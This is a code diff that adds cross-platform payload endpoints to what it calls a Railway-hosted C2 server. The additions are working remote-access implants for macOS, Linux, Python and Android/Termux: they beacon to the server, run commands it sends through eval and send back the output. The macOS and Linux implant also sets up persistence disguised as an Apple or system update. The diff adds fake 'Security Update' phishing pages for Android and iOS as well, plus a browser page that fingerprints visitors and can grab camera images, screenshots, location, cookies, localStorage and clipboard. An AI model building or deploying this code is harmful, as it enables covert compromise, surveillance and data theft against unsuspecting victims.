@@ -523,7 +523,1269 @@ def admin_stats():
 # ZUSÄTZLICHE ENDPUNKTE FÜR BADUSB PAYLOADS
 # Konfiguriert für: https://hitrunc2server-production.up.railway.app
 # =============================================================================
+# =============================================================================
+# =============================================================================
+# CROSS-PLATFORM SERVER ENDPUNKTE
+# Für macOS, Linux, Android, iOS und Universal Web
+# =============================================================================
 
+import platform
+import subprocess
+import base64
+from flask import request, jsonify, Response
+from user_agents import parse
+
+# =============================================================================
+# macOS & LINUX ENDPOINTS
+# =============================================================================
+
+@app.route('/unix')
+def unix_payload():
+    """Unix/Linux/macOS Bash Payload"""
+    user_agent = request.headers.get('User-Agent', '')
+    
+    # Detect OS
+    is_macos = 'Mac' in user_agent or 'Darwin' in user_agent
+    is_linux = 'Linux' in user_agent and 'Android' not in user_agent
+    
+    script = f'''#!/bin/bash
+# Railway C2 Unix Payload
+SERVER="https://hitrunc2server-production.up.railway.app"
+
+# System Information
+HOSTNAME=$(hostname)
+USERNAME=$(whoami)
+OS_INFO=$(uname -a)
+IS_ROOT=false
+
+if [ "$EUID" -eq 0 ]; then
+    IS_ROOT=true
+fi
+
+# macOS specific info
+if [[ "$OSTYPE" == "darwin"* ]]; then
+    OS_INFO="$OS_INFO $(sw_vers -productName) $(sw_vers -productVersion)"
+fi
+
+# Send initial beacon
+curl -s -X POST "$SERVER/b" \\
+    -H "Content-Type: application/json" \\
+    -d "{{
+        \\"h\\": \\"$HOSTNAME\\",
+        \\"u\\": \\"$USERNAME\\", 
+        \\"a\\": $IS_ROOT,
+        \\"os\\": \\"$OS_INFO\\"
+    }}" || true
+
+# Command loop
+while true; do
+    sleep 30
+    
+    # Get commands
+    COMMANDS=$(curl -s -X POST "$SERVER/b" \\
+        -H "Content-Type: application/json" \\
+        -d "{{
+            \\"h\\": \\"$HOSTNAME\\",
+            \\"u\\": \\"$USERNAME\\",
+            \\"a\\": $IS_ROOT,
+            \\"os\\": \\"$OS_INFO\\"
+        }}" | python3 -c "import sys,json; data=json.load(sys.stdin); [print(cmd) for cmd in data.get('c',[])]" 2>/dev/null)
+    
+    # Execute commands
+    if [ ! -z "$COMMANDS" ]; then
+        while IFS= read -r cmd; do
+            if [ ! -z "$cmd" ]; then
+                OUTPUT=$(eval "$cmd" 2>&1)
+                
+                # Send result
+                curl -s -X POST "$SERVER/r" \\
+                    -H "Content-Type: application/json" \\
+                    -d "{{
+                        \\"h\\": \\"$HOSTNAME\\",
+                        \\"c\\": \\"$cmd\\",
+                        \\"o\\": \\"$OUTPUT\\",
+                        \\"t\\": 0,
+                        \\"s\\": true
+                    }}" || true
+            fi
+        done <<< "$COMMANDS"
+    fi
+done &
+
+# Persistence
+{"# macOS LaunchAgent" if is_macos else "# Linux Systemd Service"}
+PERSIST_DIR="{'$HOME/Library/LaunchAgents' if is_macos else '$HOME/.config/systemd/user'}"
+mkdir -p "$PERSIST_DIR" 2>/dev/null
+
+{"# macOS plist" if is_macos else "# Linux service"}
+cat > "$PERSIST_DIR/{'com.apple.systemupdate.plist' if is_macos else 'system-update.service'}" << 'EOF'
+{"<?xml version='1.0' encoding='UTF-8'?>" if is_macos else "[Unit]"}
+{"<!DOCTYPE plist PUBLIC '-//Apple//DTD PLIST 1.0//EN' 'http://www.apple.com/DTDs/PropertyList-1.0.dtd'>" if is_macos else "Description=System Update Service"}
+{"<plist version='1.0'>" if is_macos else "After=network.target"}
+{"<dict>" if is_macos else ""}
+{"    <key>Label</key>" if is_macos else "[Service]"}
+{"    <string>com.apple.systemupdate</string>" if is_macos else "Type=simple"}
+{"    <key>ProgramArguments</key>" if is_macos else f"ExecStart=/bin/bash -c 'curl -fsSL {request.url_root.rstrip('/')}/unix | bash'"}
+{"    <array>" if is_macos else "Restart=always"}
+{"        <string>/bin/bash</string>" if is_macos else "User=%i"}
+{"        <string>-c</string>" if is_macos else ""}
+{"        <string>curl -fsSL https://hitrunc2server-production.up.railway.app/unix | bash</string>" if is_macos else "[Install]"}
+{"    </array>" if is_macos else "WantedBy=default.target"}
+{"    <key>RunAtLoad</key>" if is_macos else ""}
+{"    <true/>" if is_macos else ""}
+{"</dict>" if is_macos else ""}
+{"</plist>" if is_macos else ""}
+EOF
+
+{"launchctl load $PERSIST_DIR/com.apple.systemupdate.plist 2>/dev/null || true" if is_macos else "systemctl --user enable system-update.service 2>/dev/null || true"}
+{"systemctl --user start system-update.service 2>/dev/null || true" if not is_macos else ""}
+
+echo "System update installed successfully"
+'''
+    
+    return Response(script, mimetype='text/plain')
+
+@app.route('/python')  
+def python_payload():
+    """Python-based Cross-Platform Payload"""
+    payload = '''
+import os
+import sys
+import json
+import time
+import platform
+import subprocess
+import urllib.request
+import urllib.parse
+
+SERVER = "https://hitrunc2server-production.up.railway.app"
+
+def get_system_info():
+    hostname = platform.node()
+    username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
+    os_info = f"{platform.system()} {platform.release()}"
+    is_admin = os.getuid() == 0 if hasattr(os, 'getuid') else False
+    
+    return hostname, username, os_info, is_admin
+
+def send_beacon(hostname, username, os_info, is_admin):
+    try:
+        data = {
+            'h': hostname,
+            'u': username, 
+            'a': is_admin,
+            'os': os_info
+        }
+        
+        req = urllib.request.Request(
+            f"{SERVER}/b",
+            data=json.dumps(data).encode(),
+            headers={'Content-Type': 'application/json'}
+        )
+        
+        with urllib.request.urlopen(req) as response:
+            return json.loads(response.read().decode())
+    except:
+        return {'c': []}
+
+def send_result(hostname, command, output):
+    try:
+        data = {
+            'h': hostname,
+            'c': command,
+            'o': output,
+            't': 0,
+            's': True
+        }
+        
+        req = urllib.request.Request(
+            f"{SERVER}/r",
+            data=json.dumps(data).encode(),
+            headers={'Content-Type': 'application/json'}
+        )
+        
+        urllib.request.urlopen(req)
+    except:
+        pass
+
+def main():
+    hostname, username, os_info, is_admin = get_system_info()
+    
+    while True:
+        try:
+            response = send_beacon(hostname, username, os_info, is_admin)
+            commands = response.get('c', [])
+            
+            for cmd in commands:
+                if cmd:
+                    try:
+                        output = subprocess.check_output(
+                            cmd, shell=True, stderr=subprocess.STDOUT, 
+                            universal_newlines=True, timeout=30
+                        )
+                    except subprocess.TimeoutExpired:
+                        output = "Command timed out"
+                    except Exception as e:
+                        output = f"Error: {str(e)}"
+                    
+                    send_result(hostname, cmd, output)
+            
+            time.sleep(30)
+        except KeyboardInterrupt:
+            break
+        except:
+            time.sleep(60)
+
+if __name__ == "__main__":
+    main()
+'''
+    
+    return Response(payload, mimetype='text/plain')
+
+# =============================================================================
+# ANDROID ENDPOINTS
+# =============================================================================
+
+@app.route('/android')
+def android_page():
+    """Android Web Interface"""
+    html = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📱 Android Security Update</title>
+    <style>
+        body { font-family: 'Roboto', Arial, sans-serif; margin: 0; padding: 20px; background: #1a1a1a; color: white; }
+        .container { max-width: 400px; margin: 0 auto; text-align: center; }
+        .logo { font-size: 48px; margin-bottom: 20px; }
+        h1 { color: #4CAF50; margin-bottom: 10px; }
+        .info { background: #333; padding: 20px; border-radius: 12px; margin: 20px 0; }
+        .download-btn { 
+            background: #4CAF50; color: white; padding: 15px 30px; 
+            border: none; border-radius: 8px; font-size: 16px; cursor: pointer; 
+            text-decoration: none; display: inline-block; margin: 10px;
+        }
+        .download-btn:hover { background: #45a049; }
+        .warning { color: #ff9800; font-size: 14px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🤖</div>
+        <h1>Android Security Update</h1>
+        <p>Critical security update available for your device</p>
+        
+        <div class="info">
+            <h3>🔐 Security Patch Level</h3>
+            <p>Current: <span id="currentPatch">Loading...</span></p>
+            <p>Available: <span style="color: #4CAF50;">Latest</span></p>
+        </div>
+        
+        <a href="/download/android-security-update.apk" class="download-btn">
+            📥 Download Security Update
+        </a>
+        
+        <a href="/termux" class="download-btn">
+            🔧 Advanced Installation
+        </a>
+        
+        <div class="warning">
+            ⚠️ Install from unknown sources must be enabled
+        </div>
+    </div>
+    
+    <script>
+        // Android-specific fingerprinting
+        function collectAndroidInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                battery: 'getBattery' in navigator ? 'supported' : 'not supported',
+                vibration: 'vibrate' in navigator ? 'supported' : 'not supported'
+            };
+            
+            // Send Android device info
+            fetch('/device-fingerprint', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    type: 'android_visit',
+                    info: info,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            
+            // Update patch level (fake)
+            document.getElementById('currentPatch').textContent = '2023-11-01';
+        }
+        
+        // Collect info on page load
+        collectAndroidInfo();
+        
+        // Try to trigger download notification
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js').catch(() => {});
+        }
+    </script>
+</body>
+</html>
+    '''
+    return html
+
+@app.route('/termux')
+def termux_payload():
+    """Termux-specific payload for Android"""
+    script = '''#!/data/data/com.termux/files/usr/bin/bash
+# Termux Android Payload
+
+echo "📱 Installing Android C2 client..."
+
+# Install dependencies
+pkg update -y
+pkg install -y python curl jq
+
+# System info
+HOSTNAME=$(getprop ro.product.model | tr ' ' '_')
+USERNAME="android"
+OS_INFO="Android $(getprop ro.build.version.release)"
+IS_ROOT=false
+
+if [ "$UID" -eq 0 ]; then
+    IS_ROOT=true
+fi
+
+# Check if device is rooted
+if command -v su >/dev/null 2>&1; then
+    IS_ROOT=true
+fi
+
+SERVER="https://hitrunc2server-production.up.railway.app"
+
+# Send beacon
+curl -s -X POST "$SERVER/b" \\
+    -H "Content-Type: application/json" \\
+    -d "{
+        \\"h\\": \\"$HOSTNAME\\",
+        \\"u\\": \\"$USERNAME\\",
+        \\"a\\": $IS_ROOT,
+        \\"os\\": \\"$OS_INFO\\"
+    }"
+
+echo "✅ Android C2 client installed"
+echo "🔄 Starting background service..."
+
+# Background command loop
+(
+while true; do
+    sleep 45
+    
+    COMMANDS=$(curl -s -X POST "$SERVER/b" \\
+        -H "Content-Type: application/json" \\
+        -d "{
+            \\"h\\": \\"$HOSTNAME\\",
+            \\"u\\": \\"$USERNAME\\",
+            \\"a\\": $IS_ROOT,
+            \\"os\\": \\"$OS_INFO\\"
+        }" | jq -r '.c[]?' 2>/dev/null)
+    
+    if [ ! -z "$COMMANDS" ]; then
+        echo "$COMMANDS" | while IFS= read -r cmd; do
+            if [ ! -z "$cmd" ]; then
+                OUTPUT=$(eval "$cmd" 2>&1)
+                
+                curl -s -X POST "$SERVER/r" \\
+                    -H "Content-Type: application/json" \\
+                    -d "{
+                        \\"h\\": \\"$HOSTNAME\\",
+                        \\"c\\": \\"$cmd\\",
+                        \\"o\\": \\"$OUTPUT\\",
+                        \\"t\\": 0,
+                        \\"s\\": true
+                    }"
+            fi
+        done
+    fi
+done
+) &
+
+echo "🎉 Setup complete! Android device connected to C2."
+'''
+    
+    return Response(script, mimetype='text/plain')
+
+# =============================================================================
+# UNIVERSAL WEB ENDPOINT
+# =============================================================================
+
+@app.route('/universal')
+def universal_web():
+    """Universal Web-based Cross-Platform C2"""
+    html = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌐 System Update</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', Arial, sans-serif; 
+            margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center;
+        }
+        .container { 
+            max-width: 500px; background: rgba(255,255,255,0.1); 
+            backdrop-filter: blur(10px); border-radius: 20px; padding: 40px; text-align: center;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        .logo { font-size: 64px; margin-bottom: 20px; }
+        h1 { margin-bottom: 10px; font-size: 28px; }
+        .status { background: rgba(76,175,80,0.2); padding: 15px; border-radius: 10px; margin: 20px 0; }
+        .progress { background: rgba(255,255,255,0.2); height: 8px; border-radius: 4px; margin: 20px 0; overflow: hidden; }
+        .progress-bar { background: #4CAF50; height: 100%; width: 0%; transition: width 2s ease; }
+        .info { font-size: 14px; opacity: 0.8; margin-top: 20px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">⚡</div>
+        <h1>System Update</h1>
+        <p id="statusText">Checking system compatibility...</p>
+        
+        <div class="status">
+            <div id="systemInfo">🖥️ Analyzing system...</div>
+        </div>
+        
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="info">
+            <div id="detailsText">Please wait while we optimize your system...</div>
+        </div>
+    </div>
+    
+    <script>
+        class UniversalC2 {
+            constructor() {
+                this.server = 'https://hitrunc2server-production.up.railway.app';
+                this.sessionId = this.generateSessionId();
+                this.init();
+            }
+            
+            generateSessionId() {
+                return 'web-' + Math.random().toString(36).substr(2, 9);
+            }
+            
+            async init() {
+                await this.collectSystemInfo();
+                await this.sendInitialBeacon();
+                this.startCommandLoop();
+                this.setupPersistence();
+                this.updateUI();
+            }
+            
+            async collectSystemInfo() {
+                this.systemInfo = {
+                    hostname: this.sessionId,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth,
+                        pixelRatio: window.devicePixelRatio
+                    },
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    memory: navigator.deviceMemory || 'unknown',
+                    cores: navigator.hardwareConcurrency || 'unknown',
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink
+                    } : 'unknown',
+                    battery: await this.getBatteryInfo(),
+                    permissions: await this.checkPermissions(),
+                    plugins: Array.from(navigator.plugins).map(p => p.name),
+                    webgl: this.getWebGLInfo(),
+                    canvas: this.getCanvasFingerprint()
+                };
+                
+                // OS Detection
+                const ua = navigator.userAgent;
+                if (ua.includes('Windows')) this.os = 'Windows';
+                else if (ua.includes('Mac')) this.os = 'macOS';
+                else if (ua.includes('Linux') && !ua.includes('Android')) this.os = 'Linux';
+                else if (ua.includes('Android')) this.os = 'Android';
+                else if (ua.includes('iPhone') || ua.includes('iPad')) this.os = 'iOS';
+                else this.os = 'Unknown';
+            }
+            
+            async getBatteryInfo() {
+                try {
+                    if ('getBattery' in navigator) {
+                        const battery = await navigator.getBattery();
+                        return {
+                            level: battery.level,
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    }
+                } catch (e) {}
+                return 'unavailable';
+            }
+            
+            async checkPermissions() {
+                const permissions = {};
+                const permissionNames = ['camera', 'microphone', 'geolocation', 'notifications'];
+                
+                for (const name of permissionNames) {
+                    try {
+                        const result = await navigator.permissions.query({name});
+                        permissions[name] = result.state;
+                    } catch (e) {
+                        permissions[name] = 'unavailable';
+                    }
+                }
+                
+                return permissions;
+            }
+            
+            getWebGLInfo() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        return {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                } catch (e) {}
+                return 'unavailable';
+            }
+            
+            getCanvasFingerprint() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillText('Universal C2 Fingerprint 🌐', 2, 2);
+                    return canvas.toDataURL();
+                } catch (e) {
+                    return 'unavailable';
+                }
+            }
+            
+            async sendInitialBeacon() {
+                try {
+                    const response = await fetch(`${this.server}/b`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            h: this.sessionId,
+                            u: 'web-user',
+                            a: false,
+                            os: `${this.os} (Web Browser)`
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    return data;
+                } catch (e) {
+                    console.error('Beacon failed:', e);
+                }
+            }
+            
+            async sendSystemFingerprint() {
+                try {
+                    await fetch(`${this.server}/exfil`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            h: this.sessionId,
+                            type: 'web_fingerprint',
+                            data: JSON.stringify(this.systemInfo),
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                } catch (e) {}
+            }
+            
+            async startCommandLoop() {
+                setInterval(async () => {
+                    try {
+                        const response = await fetch(`${this.server}/b`, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                h: this.sessionId,
+                                u: 'web-user',
+                                a: false,
+                                os: `${this.os} (Web Browser)`
+                            })
+                        });
+                        
+                        const data = await response.json();
+                        const commands = data.c || [];
+                        
+                        for (const cmd of commands) {
+                            await this.executeWebCommand(cmd);
+                        }
+                    } catch (e) {
+                        console.error('Command loop error:', e);
+                    }
+                }, 30000); // Every 30 seconds
+            }
+            
+            async executeWebCommand(command) {
+                let output = '';
+                
+                try {
+                    // Web-based command execution
+                    switch(command.toLowerCase()) {
+                        case 'whoami':
+                            output = `web-user@${this.sessionId}`;
+                            break;
+                            
+                        case 'hostname':
+                            output = this.sessionId;
+                            break;
+                            
+                        case 'systeminfo':
+                            output = JSON.stringify(this.systemInfo, null, 2);
+                            break;
+                            
+                        case 'screenshot':
+                            output = await this.takeScreenshot();
+                            break;
+                            
+                        case 'camera':
+                            output = await this.accessCamera();
+                            break;
+                            
+                        case 'location':
+                            output = await this.getLocation();
+                            break;
+                            
+                        case 'cookies':
+                            output = this.getCookies();
+                            break;
+                            
+                        case 'localstorage':
+                            output = this.getLocalStorage();
+                            break;
+                            
+                        case 'history':
+                            output = 'Browser history access restricted by same-origin policy';
+                            break;
+                            
+                        case 'clipboard':
+                            output = await this.getClipboard();
+                            break;
+                            
+                        default:
+                            if (command.startsWith('eval:')) {
+                                // JavaScript evaluation (dangerous!)
+                                try {
+                                    const jsCode = command.substring(5);
+                                    const result = eval(jsCode);
+                                    output = String(result);
+                                } catch (e) {
+                                    output = `JavaScript Error: ${e.message}`;
+                                }
+                            } else {
+                                output = `Unknown web command: ${command}`;
+                            }
+                    }
+                } catch (e) {
+                    output = `Error executing command: ${e.message}`;
+                }
+                
+                // Send result back
+                try {
+                    await fetch(`${this.server}/r`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            h: this.sessionId,
+                            c: command,
+                            o: output,
+                            t: 0,
+                            s: true
+                        })
+                    });
+                } catch (e) {}
+            }
+            
+            async takeScreenshot() {
+                try {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    return new Promise((resolve) => {
+                        video.addEventListener('loadedmetadata', () => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            
+                            const screenshot = canvas.toDataURL('image/jpeg', 0.8);
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve(screenshot);
+                        });
+                    });
+                } catch (e) {
+                    return `Screenshot failed: ${e.message}`;
+                }
+            }
+            
+            async accessCamera() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    return new Promise((resolve) => {
+                        video.addEventListener('loadedmetadata', () => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            
+                            const photo = canvas.toDataURL('image/jpeg', 0.8);
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve(photo);
+                        });
+                    });
+                } catch (e) {
+                    return `Camera access failed: ${e.message}`;
+                }
+            }
+            
+            async getLocation() {
+                return new Promise((resolve) => {
+                    if ('geolocation' in navigator) {
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                resolve(`Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`);
+                            },
+                            error => {
+                                resolve(`Location error: ${error.message}`);
+                            }
+                        );
+                    } else {
+                        resolve('Geolocation not supported');
+                    }
+                });
+            }
+            
+            getCookies() {
+                return document.cookie || 'No cookies found';
+            }
+            
+            getLocalStorage() {
+                try {
+                    const storage = {};
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        storage[key] = localStorage.getItem(key);
+                    }
+                    return JSON.stringify(storage, null, 2);
+                } catch (e) {
+                    return `LocalStorage access failed: ${e.message}`;
+                }
+            }
+            
+            async getClipboard() {
+                try {
+                    if ('clipboard' in navigator) {
+                        const text = await navigator.clipboard.readText();
+                        return text || 'Clipboard is empty';
+                    } else {
+                        return 'Clipboard API not supported';
+                    }
+                } catch (e) {
+                    return `Clipboard access denied: ${e.message}`;
+                }
+            }
+            
+            setupPersistence() {
+                // Service Worker for background execution
+                if ('serviceWorker' in navigator) {
+                    navigator.serviceWorker.register('/sw.js').catch(() => {});
+                }
+                
+                // LocalStorage persistence
+                localStorage.setItem('system_update_client', this.server);
+                
+                // Try to run in background tab
+                document.addEventListener('visibilitychange', () => {
+                    if (document.hidden) {
+                        // Page is hidden, continue running
+                        this.backgroundMode = true;
+                    } else {
+                        this.backgroundMode = false;
+                    }
+                });
+                
+                // Try to prevent page close
+                window.addEventListener('beforeunload', (e) => {
+                    e.preventDefault();
+                    e.returnValue = '';
+                });
+            }
+            
+            updateUI() {
+                const statusText = document.getElementById('statusText');
+                const systemInfo = document.getElementById('systemInfo');
+                const progressBar = document.getElementById('progressBar');
+                const detailsText = document.getElementById('detailsText');
+                
+                // Simulate update process
+                const steps = [
+                    'Analyzing system configuration...',
+                    'Checking security patches...',
+                    'Optimizing system performance...',
+                    'Installing updates...',
+                    'Finalizing configuration...',
+                    'Update completed successfully!'
+                ];
+                
+                let currentStep = 0;
+                const updateInterval = setInterval(() => {
+                    if (currentStep < steps.length) {
+                        statusText.textContent = steps[currentStep];
+                        progressBar.style.width = `${(currentStep + 1) * (100 / steps.length)}%`;
+                        
+                        if (currentStep === steps.length - 1) {
+                            setTimeout(() => {
+                                window.close();
+                            }, 2000);
+                        }
+                        
+                        currentStep++;
+                    } else {
+                        clearInterval(updateInterval);
+                    }
+                }, 2000);
+                
+                // Update system info
+                systemInfo.innerHTML = `
+                    🖥️ OS: ${this.os}<br>
+                    🌐 Browser: ${navigator.userAgent.split(' ').pop()}<br>
+                    📱 Device: ${navigator.platform}
+                `;
+                
+                detailsText.textContent = 'System optimization in progress...';
+                
+                // Send fingerprint after UI setup
+                setTimeout(() => {
+                    this.sendSystemFingerprint();
+                }, 1000);
+            }
+        }
+        
+        // Initialize Universal C2
+        const c2 = new UniversalC2();
+    </script>
+</body>
+</html>
+    '''
+    
+    return html
+
+# =============================================================================
+# iOS WEB ENDPOINT (Limited but possible)
+# =============================================================================
+
+@app.route('/ios')
+def ios_web():
+    """iOS-specific web interface"""
+    html = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>📱 iOS Security Update</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+            margin: 0; padding: 20px; background: #f2f2f7; color: #000;
+        }
+        .container { max-width: 375px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .logo { font-size: 60px; margin-bottom: 10px; }
+        .card { 
+            background: white; border-radius: 12px; padding: 20px; 
+            margin: 15px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .button { 
+            background: #007AFF; color: white; padding: 15px; 
+            border-radius: 10px; text-align: center; cursor: pointer;
+            margin: 10px 0; text-decoration: none; display: block;
+        }
+        .button:active { background: #0056CC; }
+        .warning { color: #FF3B30; font-size: 14px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🍎</div>
+            <h1>iOS Security Update</h1>
+            <p>Critical security patches available</p>
+        </div>
+        
+        <div class="card">
+            <h3>📱 Device Information</h3>
+            <div id="deviceInfo">
+                <p>Model: <span id="device">Detecting...</span></p>
+                <p>iOS Version: <span id="version">Checking...</span></p>
+                <p>Security Level: <span style="color: #FF3B30;">Vulnerable</span></p>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h3>🔒 Security Updates</h3>
+            <p>• CVE-2024-Security-Patch</p>
+            <p>• WebKit Memory Fix</p>
+            <p>• Safari Security Enhancement</p>
+        </div>
+        
+        <a href="#" class="button" onclick="installUpdate()">
+            📥 Install Security Update
+        </a>
+        
+        <a href="itms-services://?action=download-manifest&url=https://hitrunc2server-production.up.railway.app/ios-manifest.plist" class="button">
+            📲 Enterprise Installation
+        </a>
+        
+        <div class="warning">
+            ⚠️ This update requires iOS 12.0 or later
+        </div>
+    </div>
+    
+    <script>
+        // iOS-specific fingerprinting
+        function detectiOSInfo() {
+            const ua = navigator.userAgent;
+            const device = /iPhone|iPad|iPod/.test(ua) ? 
+                ua.match(/(iPhone|iPad|iPod)/)[1] : 'iOS Device';
+            
+            const versionMatch = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
+            const version = versionMatch ? 
+                `${versionMatch[1]}.${versionMatch[2]}.${versionMatch[3] || 0}` : 'Unknown';
+            
+            document.getElementById('device').textContent = device;
+            document.getElementById('version').textContent = version;
+            
+            // Send iOS fingerprint
+            const fingerprint = {
+                device: device,
+                version: version,
+                userAgent: ua,
+                screen: `${screen.width}x${screen.height}`,
+                pixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                standalone: window.navigator.standalone
+            };
+            
+            fetch('/device-fingerprint', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    type: 'ios_visit',
+                    info: fingerprint,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        }
+        
+        function installUpdate() {
+            // iOS Web-based "installation"
+            alert('📱 Opening Settings app...');
+            
+            // Try to open Settings (limited success)
+            window.location.href = 'prefs:root=General&path=SOFTWARE_UPDATE_LINK';
+            
+            // Fallback: collect more data
+            setTimeout(() => {
+                if ('devicemotion' in window) {
+                    window.addEventListener('devicemotion', function(e) {
+                        // Collect device motion data
+                        const motion = {
+                            acceleration: e.acceleration,
+                            rotationRate: e.rotationRate,
+                            interval: e.interval
+                        };
+                        
+                        fetch('/device-fingerprint', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                type: 'ios_motion',
+                                data: motion
+                            })
+                        });
+                    }, {once: true});
+                }
+            }, 1000);
+        }
+        
+        // Initialize
+        detectiOSInfo();
+        
+        // Try to add to home screen
+        if (window.navigator.standalone === false) {
+            // Show add to home screen prompt
+            const addToHome = document.createElement('div');
+            addToHome.innerHTML = `
+                <div style="position: fixed; bottom: 0; left: 0; right: 0; background: #007AFF; color: white; padding: 15px; text-align: center;">
+                    📱 Add to Home Screen for better experience
+                    <button onclick="this.parentElement.style.display='none'" style="background: none; border: none; color: white; float: right;">✕</button>
+                </div>
+            `;
+            document.body.appendChild(addToHome);
+        }
+    </script>
+</body>
+</html>
+    '''
+    return html
+
+# =============================================================================
+# DEVICE FINGERPRINTING ENDPOINT
+# =============================================================================
+
+@app.route('/device-fingerprint', methods=['POST'])
+def device_fingerprint():
+    """Collect device fingerprints from all platforms"""
+    try:
+        data = request.get_json()
+        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        user_agent = request.headers.get('User-Agent', '')
+        
+        fingerprint_data = {
+            'ip': client_ip,
+            'user_agent': user_agent,
+            'timestamp': datetime.datetime.now().isoformat(),
+            'fingerprint': data
+        }
+        
+        # Store in database
+        with db_lock:
+            with sqlite3.connect(DATABASE_FILE) as conn:
+                # Create fingerprints table if not exists
+                conn.execute('''
+                    CREATE TABLE IF NOT EXISTS device_fingerprints (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        ip_address TEXT,
+                        user_agent TEXT,
+                        fingerprint_data TEXT,
+                        platform TEXT,
+                        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                    )
+                ''')
+                
+                # Detect platform
+                platform = 'unknown'
+                if 'ios' in data.get('type', ''):
+                    platform = 'iOS'
+                elif 'android' in data.get('type', ''):
+                    platform = 'Android'
+                elif 'Windows' in user_agent:
+                    platform = 'Windows'
+                elif 'Mac' in user_agent:
+                    platform = 'macOS'
+                elif 'Linux' in user_agent:
+                    platform = 'Linux'
+                
+                conn.execute('''
+                    INSERT INTO device_fingerprints (ip_address, user_agent, fingerprint_data, platform)
+                    VALUES (?, ?, ?, ?)
+                ''', (client_ip, user_agent, json.dumps(fingerprint_data), platform))
+        
